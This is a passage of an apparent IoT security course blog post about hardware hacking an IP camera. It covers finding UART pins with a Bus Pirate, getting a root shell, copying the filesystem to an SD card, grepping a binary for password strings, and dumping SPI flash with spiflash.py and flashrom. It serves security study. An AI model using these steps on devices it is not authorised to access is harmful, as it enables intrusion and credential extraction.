	&lt;img class=&quot;image&quot; src=&quot;http://i.imgur.com/MwJ3CNj.jpg&quot; alt=&quot;Front covering with attached WiFi antenna&quot; /&gt;
    &lt;/a&gt;
    
	&lt;p class=&quot;image-caption&quot;&gt;Front covering with attached WiFi antenna&lt;/p&gt;
    

&lt;/div&gt;

&lt;/div&gt;

&lt;p&gt;Inside this front shell lies this “LED ring” with some status LED’s and the IR sensor for measuring brightness, I guess.&lt;/p&gt;

&lt;div class=&quot;image-container&quot;&gt;

	&lt;div class=&quot;image-wrapper-double&quot;&gt;
	&lt;a href=&quot;http://i.imgur.com/2Hy5mYM.png&quot; title=&quot;LED circuit back side&quot; target=&quot;_blank&quot;&gt;
	&lt;img class=&quot;image1&quot; src=&quot;http://i.imgur.com/2Hy5mYM.jpg&quot; alt=&quot;LED circuit back side&quot; /&gt;
	&lt;/a&gt;
	
	&lt;p class=&quot;image-caption&quot;&gt;LED circuit back side&lt;/p&gt;
	
	&lt;/div&gt;
	&lt;div class=&quot;image-wrapper-double&quot;&gt;
	&lt;a href=&quot;http://i.imgur.com/0H2RkYn.png&quot; title=&quot;LED circuit front side&quot; target=&quot;_blank&quot;&gt;
	&lt;img class=&quot;image2&quot; src=&quot;http://i.imgur.com/0H2RkYn.jpg&quot; alt=&quot;LED circuit front side&quot; /&gt;
	&lt;/a&gt;
	
	&lt;p class=&quot;image-caption&quot;&gt;LED circuit front side&lt;/p&gt;
	
	&lt;/div&gt;

&lt;/div&gt;

&lt;h2 id=&quot;2-access-over-hardware-ports&quot;&gt;2. Access over Hardware Ports&lt;/h2&gt;
&lt;h3 id=&quot;21-uart&quot;&gt;2.1 UART&lt;/h3&gt;

&lt;p&gt;Without taking further measurements, I suspected the three pins in previous picture to be a UART serial port.
As the first one has a squareformed joint, it’s supposed to be the GND pin and the two other ones Tx and Rx.&lt;/p&gt;

&lt;div class=&quot;image-container&quot;&gt;
	
&lt;div class=&quot;image-wrapper-single&quot;&gt;
    &lt;a href=&quot;http://i.imgur.com/kjnXzwU.jpg&quot; title=&quot;UART Buspirate setup&quot; target=&quot;_blank&quot;&gt;
	&lt;img class=&quot;image&quot; src=&quot;http://i.imgur.com/kjnXzwU.jpg&quot; alt=&quot;UART Buspirate setup&quot; /&gt;
    &lt;/a&gt;
    
	&lt;p class=&quot;image-caption&quot;&gt;UART Buspirate setup&lt;/p&gt;
    

&lt;/div&gt;

&lt;/div&gt;

&lt;p&gt;I examined the ports with a buspirate and beeing sure I have the right ports, I tried all popular baudrates and parity bits:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;HiZ&amp;gt;m	&lt;span class=&quot;c&quot;&gt;#Choose protocol from main buspirate interface&lt;/span&gt;
1. HiZ
2. 1-WIRE
3. UART
4. I2C
5. SPI
6. 2WIRE
7. 3WIRE
8. LCD
9. DIO
x. &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;without change&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;)&amp;gt;&lt;/span&gt;3	&lt;span class=&quot;c&quot;&gt;#taking UART&lt;/span&gt;
Set serial port speed: &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;bps&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
 1. 300
 2. 1200
 3. 2400
 4. 4800
 5. 9600
 6. 19200
 7. 38400
 8. 57600
 9. 115200
10. BRG raw value

&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;)&amp;gt;&lt;/span&gt;9	&lt;span class=&quot;c&quot;&gt;#taking baudrate 115200&lt;/span&gt;
Data bits and parity:
 1. 8, NONE &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;default 
 2. 8, EVEN 
 3. 8, ODD 
 4. 9, NONE
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;)&amp;gt;&lt;/span&gt;	&lt;span class=&quot;c&quot;&gt;# taking default value &quot;no parity&quot;&lt;/span&gt;
Stop bits:
 1. 1 &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;default
 2. 2
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;)&amp;gt;&lt;/span&gt;	&lt;span class=&quot;c&quot;&gt;# taking default value &quot;no stop bits&quot;&lt;/span&gt;
Receive polarity:
 1. Idle 1 &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;default
 2. Idle 0
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;)&amp;gt;&lt;/span&gt;	&lt;span class=&quot;c&quot;&gt;# is the Rx port high or low when it's idle, taking default&lt;/span&gt;
Select output &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;:
 1. Open drain &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;H&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Hi-Z, &lt;span class=&quot;nv&quot;&gt;L&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;GND&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
 2. Normal &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;H&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;3.3V, &lt;span class=&quot;nv&quot;&gt;L&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;GND&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;)&amp;gt;&lt;/span&gt;	&lt;span class=&quot;c&quot;&gt;# taking open drain as driver circuit for the port&lt;/span&gt;
Ready
UART&amp;gt;v	&lt;span class=&quot;c&quot;&gt;# checking the Pinout of the BusPirate&lt;/span&gt;
Pinstates:
1.&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;BR&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;	2.&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RD&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;	3.&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;OR&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;	4.&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;YW&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;	5.&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;	6.&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;BL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;	7.&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;PU&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;	8.&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GR&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;	9.&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;WT&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;	0.&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Blk&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
GND	3.3V	5.0V	ADC	VPU	AUX	-	TxD	-	RxD
P	P	P	I	I	I	I	I	I	I	
GND	0.00V	0.00V	0.00V	0.00V	L	L	L	L	L	

UART&amp;gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# choosing mode to only receive output&lt;/span&gt;
Raw UART input
Any key to &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;�ʛ���s�Ϲܒ&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;���e����k��������������ʗ���0�����������������컚�Ϙ�ߚЛ�������������%�������i���C�������q ��q����&lt;span class=&quot;s2&quot;&gt;&quot;�c9�a�&quot;&lt;/span&gt;:�i���C�������q ��q����&lt;span class=&quot;s2&quot;&gt;&quot;�c9�a�&quot;&lt;/span&gt;���i���C�������q ��q����&lt;span class=&quot;s2&quot;&gt;&quot;�c9�a�&quot;&lt;/span&gt;���i��
...
q ��&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;���&lt;span class=&quot;s2&quot;&gt;&quot;��c9ñ&quot;&lt;/span&gt;:��C��������q &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;�&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;���&lt;span class=&quot;s2&quot;&gt;&quot;�c9ñ&quot;&lt;/span&gt;:��C��������q &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;�&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;���&lt;span class=&quot;s2&quot;&gt;&quot;�c9ñ&quot;&lt;/span&gt;:�i
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Trying all different baudrates and parity bits didn’t give any better result.
With a hint of https://twitter.com/adi1391 (course instructor) it was easy. The square pin isn’t GND, it’s RX (RX,GND,TX) with baudrate of 115200. I don’t know whether it’s the desired behaviour or a bug. In every case it will create some confusion.&lt;/p&gt;

&lt;div class=&quot;image-container&quot;&gt;
	
&lt;div class=&quot;image-wrapper-single&quot;&gt;
    &lt;a href=&quot;http://i.imgur.com/ZIkf5W2.jpg&quot; title=&quot;UART soldering&quot; target=&quot;_blank&quot;&gt;
	&lt;img class=&quot;image&quot; src=&quot;http://i.imgur.com/ZIkf5W2.jpg&quot; alt=&quot;UART soldering&quot; /&gt;
    &lt;/a&gt;
    
	&lt;p class=&quot;image-caption&quot;&gt;UART soldering&lt;/p&gt;
    

&lt;/div&gt;

&lt;/div&gt;

&lt;p&gt;So first lesson learned: Never trust in habits.
With this pinning I was able to get readable output and furthermore a shell with Root Rights but the whole file system is mounted only as readable.
For the sake of readabilty I will put booting output into external link.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/herrfeder/Offensive_IOT_Exploitation/blob/master/gist_files/booting_output.txt&quot;&gt;Booting Stdout&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;It gives some interesting information:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;The flash isn’t complying (like I mentioned before) with it’s printing. It’s 16MB in size. Enough to hold a whole flash firmware.&lt;/li&gt;
  &lt;li&gt;Flash software is iJFFS2 version 2.2. (NAND) from Red Hat&lt;/li&gt;
  &lt;li&gt;Flash communicates via SPI and creates 6 partitions on the flash
    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SPI_FLASH spi0.0: MX25L12845E &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;16384 Kbytes&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Creating 6 MTD partitions on &lt;span class=&quot;s2&quot;&gt;&quot;nor-flash&quot;&lt;/span&gt;:
0x000000010000-0x000000080000 : &lt;span class=&quot;s2&quot;&gt;&quot;UBOOT&quot;&lt;/span&gt;
0x000000080000-0x000000380000 : &lt;span class=&quot;s2&quot;&gt;&quot;LINUX&quot;&lt;/span&gt;
0x000000380000-0x000000b00000 : &lt;span class=&quot;s2&quot;&gt;&quot;FS&quot;&lt;/span&gt;
0x000000b00000-0x000000c00000 : &lt;span class=&quot;s2&quot;&gt;&quot;USER0&quot;&lt;/span&gt;
0x000000c00000-0x000001000000 : &lt;span class=&quot;s2&quot;&gt;&quot;USER1&quot;&lt;/span&gt;
0x000000000000-0x000001000000 : &lt;span class=&quot;s2&quot;&gt;&quot;ALL&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;OS runs Linux RTOS with busybox on squashfs filesystem and library relies on microClib (important for executing external binaries)&lt;/li&gt;
  &lt;li&gt;DRAM is 64 MiB&lt;/li&gt;
  &lt;li&gt;we have USB interfaces (probably for the SD Card Reader)
    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Drive Vbus because of ID pin shows Device A
fotg210 fotg210.0: FOTG2XX
fotg210 fotg210.0: new USB bus registered, assigned bus number 1
fotg210 fotg210.0: irq 9, io mem 0x93000000
fotg210 fotg210.0: USB 2.0 started, EHCI 1.00
hub 1-0:1.0: USB hub found
hub 1-0:1.0: 1 port detected
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;there is a I2C bus
    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;i2c /dev entries driver
ftiic010 ftiic010.0: irq 18, mapped at 84860000
I2C hangs detection thread started!
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;uses lib80211 for WiFi functionalities&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;After getting through booting and many applies of doing some OS tasks we have a shell.
The shell will be harassed by intervalled output of WiFi Core that indicates it’s in STA mode and scans for a certain AP.&lt;/p&gt;

&lt;h3 id=&quot;22-getting-firmware&quot;&gt;2.2 Getting Firmware&lt;/h3&gt;

&lt;h4 id=&quot;221-dumping-from-system-via-sdcard&quot;&gt;2.2.1 Dumping from System via SDCard&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;We can dump nearly the whole filesystem by simply copying it onto an sdcard.&lt;/li&gt;
  &lt;li&gt;It will be mounted as /mnt/disk1.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/mnt &lt;span class=&quot;c&quot;&gt;# mmc0: new high speed SDHC card at address e624&lt;/span&gt;
mmcblk0: mmc0:e624 SU08G 7.40 GiB 
 mmcblk0:
found removeable disk1 
mount  removeable disk1 OK 
dwDiscState &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 2 

/# &lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; / /mnt/disk1/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Searching for interesting info bits in the file system&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# grep -rli aes&lt;/span&gt;
npc/npc
patch/bin/wpa_supplicant
patch/lib/mt7601Usta_v2.ko
lib/modules/ms.ko

&lt;span class=&quot;c&quot;&gt;# grep -rli firmware&lt;/span&gt;
npc/npc
patch/bin/ifrename
patch/lib/mt7601Usta_v2.ko
gm/bin/busybox
gm/tools/ethtool
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;The directory npc with the executable npc seems to be very interesting:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/npc &lt;span class=&quot;c&quot;&gt;# ls&lt;/span&gt;
dhcp.script     minihttpd.conf  patch           txt             wPipe
gwellipc        mtd             pipe_create     upgfile_ok
img             npc             sound           version.txt

/npc &lt;span class=&quot;c&quot;&gt;# cat npc | grep aes&lt;/span&gt;
aes-128-ecb
aes-128-cbc
aes-128-ofb
aes-128-cfb
...
id-aes128-wrap
id-aes192-wrap
id-aes256-wrap
e_aes.c
aes key setup failed


/npc &lt;span class=&quot;c&quot;&gt;# cat npc | grep -i password&lt;/span&gt;
Password
PasswordType
RemotlySetPassword
Super_Password
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;cESSID:%s,cPassword:%s,dwEncType &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; %d
challengePassword
...
Password Fail &lt;span class=&quot;nv&quot;&gt;IP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;%d &lt;span class=&quot;nv&quot;&gt;Counter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;%d &lt;span class=&quot;nv&quot;&gt;dwPassword&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;%d
Guest Password verify OK 1...
Password verify fail 1...
Super Password 
super+manager Password 
Password verify OK1 ...
Password verify fail 1...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;npc has a lot of strings in it related to encrypting and network authentication. It’s necessary to obtain this binary from the filesystem to examine it in detail.
I will look into the npc binary in a additional gistfile: https://gist.github.com/herrfeder/883093ae93eaefba8950c00f6a6bbed8#file-sricam_upnp_npc-md&lt;/p&gt;

&lt;h4 id=&quot;222-dumping-flash-via-spi&quot;&gt;2.2.2 Dumping Flash via SPI&lt;/h4&gt;

&lt;p&gt;My initial concept was to use the Attify Badge with the description from the IOT Exploitation Manual with the tool spiflash (https://github.com/devttys0/libmpsse). As I own a Testclip for 8-pin DIP-Chips, I can simply attach it to the Flash Chip with the following pinning:&lt;/p&gt;

&lt;div class=&quot;image-container&quot;&gt;

	&lt;div class=&quot;image-wrapper-double&quot;&gt;
	&lt;a href=&quot;http://i.imgur.com/HTxJdvf.jpg&quot; title=&quot;Testclip on the Flash Chip&quot; target=&quot;_blank&quot;&gt;
	&lt;img class=&quot;image1&quot; src=&quot;http://i.imgur.com/HTxJdvf.jpg&quot; alt=&quot;Testclip on the Flash Chip&quot; /&gt;
	&lt;/a&gt;
	
	&lt;p class=&quot;image-caption&quot;&gt;Testclip on the Flash Chip&lt;/p&gt;
	
	&lt;/div&gt;
	&lt;div class=&quot;image-wrapper-double&quot;&gt;
	&lt;a href=&quot;http://i.imgur.com/53Claa1.jpg&quot; title=&quot;Pinning of the Testclip Cable&quot; target=&quot;_blank&quot;&gt;
	&lt;img class=&quot;image2&quot; src=&quot;http://i.imgur.com/53Claa1.jpg&quot; alt=&quot;Pinning of the Testclip Cable&quot; /&gt;
	&lt;/a&gt;
	
	&lt;p class=&quot;image-caption&quot;&gt;Pinning of the Testclip Cable&lt;/p&gt;
	
	&lt;/div&gt;

&lt;/div&gt;

&lt;div class=&quot;image-container&quot;&gt;
	
&lt;div class=&quot;image-wrapper-single&quot;&gt;
    &lt;a href=&quot;http://i.imgur.com/8q7AWW3.jpg&quot; title=&quot;Overview of SPI flashing with Attify Badge&quot; target=&quot;_blank&quot;&gt;
	&lt;img class=&quot;image&quot; src=&quot;http://i.imgur.com/8q7AWW3.jpg&quot; alt=&quot;Overview of SPI flashing with Attify Badge&quot; /&gt;
    &lt;/a&gt;
    
	&lt;p class=&quot;image-caption&quot;&gt;Overview of SPI flashing with Attify Badge&lt;/p&gt;
    

&lt;/div&gt;

&lt;/div&gt;

&lt;p&gt;It will sucessfully detect the Flash Chip probably indicated by the zeros. Because without attaching anything or the wrong pins it will show up “FF FF FF” instead (maybe it’s only indicating signal high on connected pin):&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# ~/tools/libmpsse/src/examples&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;python spiflash.py &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;oit: 
FT232H Future Technology Devices International, Ltd initialized at 15000000 hertz
00 00 00 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Now I will try to dump it’s memory to a file. We need some information to do so like the address offset where the firmware image starts and the size of memory. We know from the booting process that the uBoot Partition starts at 0x10000 (int 65536) and the memory size is 16MiB (16&lt;em&gt;1024&lt;/em&gt;1024). So we can try to start the script with the right params:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# ~/tools/libmpsse/src/examples&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;python spiflash.py &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; 65536 &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; 167510016 &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; ip_cam.bin
FT232H Future Technology Devices International, Ltd initialized at 15000000 hertz
Reading 167510016 bytes starting at address 0x10000...saved to ip_cam.bin.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;But when looking into the file, it only has 0x0000 in it:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# ~/tools/libmpsse/src/examples&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;hexdump ip_cam.bin 
0000000 0000 0000 0000 0000 0000 0000 0000 0000
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
9fc0000
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;After some research I saw that others struggled with the same problem:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://github.com/Marzogh/SPIFlash/issues/37&lt;/li&gt;
  &lt;li&gt;https://www.ghostlyhaks.com/forum/rom-eeprom-bios-efi-uefi/64-can-t-dump-or-read-mx25l6406e-chip&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I decided to give the Bus Pirate a try with the tool flashrom (https://www.flashrom.org/Bus_Pirate) as it’s supports the BusPirate directly. I got the BusPirate SPI Pinning:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SPI&amp;gt;v
Pinstates:
1.&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;BR&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;	2.&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RD&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;	3.&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;OR&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;	4.&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;YW&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;	5.&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;	6.&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;BL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;	7.&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;PU&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;	8.&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GR&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;	9.&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;WT&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;	0.&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Blk&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
GND	3.3V	5.0V	ADC	VPU	AUX	CLK	MOSI	CS	MISO
P	P	P	I	I	I	O	O	O	I	
GND	0.00V	0.00V	0.00V	0.00V	L	L	L	L	L	
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;and connected it to the Testclip, the following way:&lt;/p&gt;

&lt;div class=&quot;image-container&quot;&gt;
	
&lt;div class=&quot;image-wrapper-single&quot;&gt;
    &lt;a href=&quot;http://i.imgur.com/CqYLtBW.jpg&quot; title=&quot;Overview of SPI flashing with Buspirate&quot; target=&quot;_blank&quot;&gt;
	&lt;img class=&quot;image&quot; src=&quot;http://i.imgur.com/CqYLtBW.jpg&quot; alt=&quot;Overview of SPI flashing with Buspirate&quot; /&gt;
    &lt;/a&gt;
    
	&lt;p class=&quot;image-caption&quot;&gt;Overview of SPI flashing with Buspirate&lt;/p&gt;
    

&lt;/div&gt;

&lt;/div&gt;

&lt;p&gt;Using the command for flashrom to write the memory into file:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# ~/tools/&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;flashrom &lt;span class=&quot;nt&quot;&gt;-V&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; buspirate_spi:dev&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/dev/ttyUSB0,spispeed&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1M &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; MX25L128.bin &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; MX25L12835F/MX25L12845E/MX25L12865E

flashrom v0.9.9-r1954 on Linux 4.7.0-kali1-amd64 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;x86_64&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
flashrom is free software, get the &lt;span class=&quot;nb&quot;&gt;source &lt;/span&gt;code at https://flashrom.org

flashrom was built with libpci 3.5.2, GCC 6.3.0 20170221, little endian
Command line &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;7 args&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: flashrom &lt;span class=&quot;nt&quot;&gt;-V&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; buspirate_spi:dev&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/dev/ttyUSB0,spispeed&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1M &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; MX25L128.bin &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; MX25L12835F/MX25L12845E/MX25L12865E
Calibrating delay loop... OS timer resolution is 1 usecs, 2605M loops per second, 10 myus &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 11 us, 100 myus &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 111 us, 1000 myus &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 1025 us, 10000 myus &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 10064 us, 4 myus &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 5 us, OK.
Initializing buspirate_spi programmer
Detected Bus Pirate hardware v3b
Detected Bus Pirate firmware 5.10
Using SPI &lt;span class=&quot;nb&quot;&gt;command set &lt;/span&gt;v2.
SPI speed is 1MHz
Raw bitbang mode version 1
Raw SPI mode version 1
The following protocols are supported: SPI.
Probing &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;Macronix MX25L12835F/MX25L12845E/MX25L12865E, 16384 kB: probe_spi_rdid_generic: id1 0xc2, id2 0x2018
Found Macronix flash chip &lt;span class=&quot;s2&quot;&gt;&quot;MX25L12835F/MX25L12845E/MX25L12865E&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;16384 kB, SPI&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; on buspirate_spi.
Chip status register is 0x00.
Chip status register: Status Register Write Disable &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SRWD, SRP, ...&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; is not &lt;span class=&quot;nb&quot;&gt;set
&lt;/span&gt;Chip status register: Bit 6 is not &lt;span class=&quot;nb&quot;&gt;set
&lt;/span&gt;Chip status register: Block Protect 3 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;BP3&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; is not &lt;span class=&quot;nb&quot;&gt;set
&lt;/span&gt;Chip status register: Block Protect 2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;BP2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; is not &lt;span class=&quot;nb&quot;&gt;set
